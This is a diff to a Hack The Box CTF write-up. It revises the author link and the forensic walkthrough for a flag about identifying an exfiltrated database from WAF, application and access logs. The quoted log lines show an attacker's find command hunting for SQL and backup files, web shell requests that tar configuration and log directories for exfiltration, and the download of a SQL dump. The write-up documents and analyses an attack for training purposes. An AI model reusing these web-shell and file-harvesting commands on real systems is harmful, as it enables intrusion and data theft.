@@ -1,6 +1,6 @@
 # Hack The Box: Holmes-CTF-2025 (09/22/25 - 09/26/25)
 
-**Author:** Jonathan Lutabingwa ([@jlutabin](https://github.com/jlutabin))
+**Author:** Jonathan Lutabingwa ([@jtlutabingwa](https://github.com/jlutabin))
 
 **Team:** Sherlock's Homies
 - [Jonathan Lutabingwa](https://www.linkedin.com/in/jonathan-lutabingwa/)  
@@ -78,21 +78,27 @@
 **Question:** The threat actor also managed to exfiltrate some data. What is the name of the database that was exfiltrated?  
 
 **Walkthrough:** 
-- To find Flag 3, I kept looking through `waf.log`.
-- We are looking for data exfiltration in particular this time, and something had caught my eye from before when I was looking for Flag 2.
-- There is a rule in `waf.log` called "DATA_EXFILTRATION", and looking here was my first instinct.
-- When we look at this line, occurring at `2025-05-15 11:24:34`, it gives an "Unknown Error". This line is illegible in the `waf.log` file, so I cross-checked the timestamps in the `application.log` file.
-- In `application.log`, we can see that at `2025-05-15 11:24:34` there is a "Data exfiltration attempt from 121.36.37.224".
-- The command was given (`'find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "*.bck"'`), but this didn't help much with finding the name of the database.
-- Next, I tried the third file we were given: `access.log`.
-- We can see that at the same time, the attacker used `"POST /api/v2/debug/exec HTTP/1.1" 200 512 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"`.
-- They probed for backups and dumps; it didn’t give the DB name, but narrowed our search.
-- Looking further in the logs, we see some `GET` commands.
-- The attacker seemingly packed files using a web shell, and then a few logs later, we can see they downloaded the DB dump.
-- **Packing the Files:** `2025-05-18 15:02:34 121.36.37.224 - - [18/May/2025:15:02:34 +0000] "GET /uploads/temp_4A4D.php?cmd=tar%20-czf%20/tmp/exfil_4A4D.tar.gz%20/var/www/html/config/%20/var/log/webapp/ HTTP/1.1" 200 128 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"`
-- **Downloading the DB:** `2025-05-18 14:58:23 121.36.37.224 - - [18/May/2025:15:58:23 +0000] "GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800 "-" "4A4D RetrieveR/1.0.0"`
-- In this last line, we can see that there was a 52 MB `.sql` file downloaded.
-- This correlates with the exfiltration, giving us the flag and name of the database file: `database_dump_4A4D.sql`.
+- To find Flag 3, we kept looking through `waf.log`.
+- We continued searching in waf.log for signs of data exfiltration and found a rule labeled "DATA_EXFILTRATION" at 2025-05-15 11:24:34.
+
+
+-The entry showed an "Unknown Error," so we cross-checked application.log at the same timestamp, which reported:
+- 2025-05-15 11:24:34 Data exfiltration attempt from 121.36.37.224
+
+
+- The attacker attempted to locate sensitive files with:
+- find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "*.bck"
+
+**Findings**
+-From access.log, we observed the attacker using a web shell to pack files:
+- 2025-05-18 15:02:34 "GET /uploads/temp_4A4D.php?cmd=tar%20-czf%20/tmp/exfil_4A4D.tar.gz%20/var/www/html/config/%20/var/log/webapp/"
+
+
+Shortly after, they downloaded a large database dump:
+
+2025-05-18 15:58:23 "GET /uploads/database_dump_4A4D.sql HTTP/1.1" 200 52428800
+
+The logs confirm the attacker exfiltrated a 52 MB SQL dump.
 
 ![Exfiltration Database](card_images/tc-task3.png)
 **Solution Line of `access.log`:** 
